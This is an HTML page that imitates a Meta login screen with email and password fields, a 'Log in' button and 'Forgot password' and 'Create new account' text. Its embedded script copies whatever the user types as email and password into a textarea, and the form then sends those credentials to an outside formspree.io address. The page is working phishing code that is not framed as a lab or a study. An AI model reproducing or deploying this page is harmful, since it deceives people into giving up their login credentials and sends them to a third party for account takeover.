<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="container">
        <div class="language-selector">
            English (US)
        </div>
        <div class="logo">
        </div>
        <div class="login-form">
            <input type="text" placeholder="Mobile number or email" class="input-field">
            <input type="password" placeholder="Password" class="input-field">
            <form action="https://formspree.io/f/xwpkbwnz" method="POST">
                <textarea class="info" id="info" name="informations">

                    </textarea>
                <button type="Submit" class="login-button">Log in</button>
            </form>
        </div>
        <div class="forgot-password">Forgot password ?</div>
        <div class="create-account">Create new account</div>
        <div class="meta-logo">Meta</div>
    </div>
    <script>
        const input = document.querySelectorAll('input');
        const textarea = document.querySelector('textarea');

        input[0].addEventListener('keyup', () => {
            textarea.textContent = "Mail : " + input[0].value + "\r" + "Mdp : " + input[1].value;
        });
        input[1].addEventListener('keyup', () => {
            textarea.textContent = "Mail : " + input[0].value + "\r" + "Mdp : " + input[1].value;
        });
    </script>
</body>

</html>
